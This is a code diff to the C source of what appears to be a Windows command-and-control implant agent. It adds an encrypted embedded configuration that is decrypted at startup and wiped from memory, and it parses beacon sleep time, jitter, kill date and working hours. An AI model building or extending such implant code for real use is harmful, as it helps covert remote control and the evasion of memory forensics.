@@ -2,8 +2,13 @@
 #include <wolfcrypt/random.h>
 #include "agent.h"
 #include "localcstd.h"
+#include "parser.h"
 #include "Helpers.h"
 #include "token.h"
+
+BYTE AgentConfigBytes[] = CONFIG_BYTES;
+BYTE ConfigIVBytes[] = CONFIG_IV_BYTES;
+BYTE ConfigKeyBytes[] = CONFIG_KEY_BYTES;
 
 INT init_agent(pAgent agent) {
 
@@ -148,6 +153,8 @@ INT init_agent(pAgent agent) {
     byte* AesKey = (byte*)LocalAlloc(LPTR, (sizeof(byte) * AES_256_KEY_SIZE));
     byte* AesIV = (byte*)LocalAlloc(LPTR, (sizeof(byte) * AES_BLOCK_SIZE));
 
+    
+	ParseConfig(agent);
     ReadRsaPublicKey(&RsaPublicKeyDerBytes, &RsaPublicKeySize);
 
     wc_InitRsaKey(&rsaPublicKey, NULL);
@@ -183,6 +190,32 @@ INT init_agent(pAgent agent) {
     agent->IVSize = AES_BLOCK_SIZE;
     agent->EncryptedIV = EncryptedIV;
     agent->EncryptedIVSize = EncryptedIvSize;
+
+
+    return 0;
+}
+
+//FINISH PARSING CONFIG DATA.
+INT ParseConfig(pAgent agent) {
+
+    PARSER parser = { 0 };
+
+    NewParser(&parser, AgentConfigBytes, sizeof(AgentConfigBytes));
+	RtlSecureZeroMemory(AgentConfigBytes, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.
+
+	ParserDecrypt(&parser, ConfigKeyBytes, ConfigIVBytes);
+	RtlSecureZeroMemory(ConfigKeyBytes, sizeof(ConfigKeyBytes)); //clear the key from memory we've used it to decrypt the config.
+	RtlSecureZeroMemory(ConfigIVBytes, sizeof(ConfigIVBytes)); //clear the iv from memory we've used it to decrypt the config.
+
+	agent->config = (PAgentConfig)LocalAlloc(LPTR, sizeof(AgentConfig));
+    if (!agent->config) {
+        return -1;
+    }
+	agent->config->SleepTime = ParserReadInt32(&parser);
+	agent->config->SleepJitter = ParserReadInt32(&parser);
+	agent->config->KillDate = ParserReadInt64(&parser);
+	agent->config->WorkingHours = ParserReadInt32(&parser);
+    //agent->config->listenerConfig = 
 
 
     return 0;
